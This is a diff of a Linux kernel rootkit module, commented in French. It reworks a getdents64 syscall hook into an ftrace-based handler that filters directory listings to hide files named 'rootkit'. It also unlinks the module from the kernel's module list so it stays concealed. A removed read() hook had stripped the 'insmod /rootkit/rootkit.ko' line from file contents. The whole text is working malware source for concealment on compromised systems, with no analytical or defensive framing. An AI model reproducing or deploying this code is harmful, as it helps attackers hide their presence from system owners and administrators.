@@ -6,13 +6,12 @@
 #include <linux/dirent.h>
 #include <linux/list.h>
 #include <linux/string.h>
+#include <linux/ptrace.h>
+#include <linux/ftrace.h>
 #include "hooking.h"
 #include "hide.h"
 
-static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
-static asmlinkage long (*orig_read)(const struct pt_regs *);
-
-// Liste chaînée de fichiers cachés
+// Structures et liste chaînée pour cacher des fichiers
 struct hidden_file {
     char name[256];
     struct list_head list;
@@ -36,32 +35,56 @@ static int should_hide(const char *name) {
     return 0;
 }
 
-static char hide_line_substr[] = "insmod /rootkit/rootkit.ko";
+// Nom du syscall hooké
+static struct ftrace_hook hide_hooks[]; // Déclaration plus bas
 
-// Hook getdents64
-static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
-    long ret = orig_getdents64(regs);
-    if (ret <= 0) return ret;
+// Pointeur vers la fonction originale
+// La signature des syscalls __x64_sys_* est asmlinkage long func(const struct pt_regs *)
+typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
+static syscall_fn_t real_getdents64 = NULL;
 
-    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *) regs->si;
+// Notre fonction directrice pour __x64_sys_getdents64
+static void notrace my_getdents64_direct(struct ftrace_regs *fregs) {
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+
+    // Arguments du syscall getdents64:
+    // fd = regs->di
+    // dirent = regs->si
+    // count = regs->dx
+    int fd = (int)regs->di;
+    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
+    unsigned int count = (unsigned int)regs->dx;
+
+    // Appeler la fonction originale
+    long ret = real_getdents64(regs);
+    if (ret <= 0) {
+        regs->ax = ret; // Valeur de retour inchangée
+        return;
+    }
+
+    // On filtre maintenant le buffer 'dirent'
+    // On duplique la logique de filtrage comme avant
     struct linux_dirent64 *kbuf = kmalloc(ret, GFP_KERNEL);
     struct linux_dirent64 *filtered = kmalloc(ret, GFP_KERNEL);
     if (!kbuf || !filtered) {
         kfree(kbuf);
         kfree(filtered);
-        return ret;
+        // Pas de filtrage possible, on retourne le résultat brut
+        regs->ax = ret;
+        return;
     }
 
     if (copy_from_user(kbuf, dirent, ret)) {
         kfree(kbuf);
         kfree(filtered);
-        return ret;
+        regs->ax = ret; // Impossible de filtrer, on retourne le brut
+        return;
     }
 
     long bpos = 0;
     long outpos = 0;
     while (bpos < ret) {
-        struct linux_dirent64 *d = (void *)((char*)kbuf + bpos);
+        struct linux_dirent64 *d = (void *)((char *)kbuf + bpos);
         if (!should_hide(d->d_name)) {
             size_t reclen = d->d_reclen;
             memcpy((char*)filtered + outpos, d, reclen);
@@ -71,62 +94,28 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
     }
 
     if (copy_to_user(dirent, filtered, outpos)) {
+        // Si on échoue, on retourne le résultat initial non filtré
         outpos = ret;
     }
 
     kfree(kbuf);
     kfree(filtered);
 
-    return outpos;
+    // Mettre à jour le code retour
+    regs->ax = outpos;
 }
 
-// Hook read
-static asmlinkage long hooked_read(const struct pt_regs *regs) {
-    long ret = orig_read(regs);
-    if (ret <= 0) return ret;
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 
-    char __user *buf = (char __user *)regs->si;
-    char *kbuf = kmalloc(ret+1, GFP_KERNEL);
-    if (!kbuf) return ret;
-
-    if (copy_from_user(kbuf, buf, ret)) {
-        kfree(kbuf);
-        return ret;
-    }
-
-    kbuf[ret] = '\0';
-
-    char *pos = strstr(kbuf, hide_line_substr);
-    if (pos) {
-        char *line_start = pos;
-        while (line_start > kbuf && *(line_start-1) != '\n')
-            line_start--;
-        char *line_end = pos;
-        while (*line_end && *line_end != '\n')
-            line_end++;
-        if (*line_end == '\n') line_end++;
-
-        size_t prefix_len = line_start - kbuf;
-        size_t suffix_len = (kbuf+ret) - line_end;
-
-        memmove(line_start, line_end, suffix_len);
-        ret = prefix_len + suffix_len;
-    }
-
-    if (copy_to_user(buf, kbuf, ret)) {
-        // Pas de gestion d'erreur supplémentaire
-    }
-
-    kfree(kbuf);
-    return ret;
-}
-
+// Définition des hooks
 static struct ftrace_hook hide_hooks[] = {
-    HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
-    HOOK("__x64_sys_read", hooked_read, &orig_read),
+    HOOK("__x64_sys_getdents64", my_getdents64_direct, &orig_getdents64),
+    // Vous pouvez ajouter ici d'autres hooks comme __x64_sys_read
+    // HOOK("__x64_sys_read", my_read_direct, &orig_read),
 };
 
-// Cacher le module dans /proc/modules en le retirant de la liste
+static char hide_line_substr[] = "insmod /rootkit/rootkit.ko";
+
 static void hide_module(void) {
     struct module *mod = THIS_MODULE;
     list_del(&mod->list);
@@ -135,8 +124,13 @@ static void hide_module(void) {
 int init_hide(void) {
     int err = install_hooks(hide_hooks, ARRAY_SIZE(hide_hooks));
     if (err) return err;
+
+    // On met à jour notre pointeur vers la fonction originale getdents64
+    real_getdents64 = (syscall_fn_t) * (unsigned long *)hide_hooks[0].original;
+
     hide_module();
     hide_add_file("rootkit");
+
     return 0;
 }
 
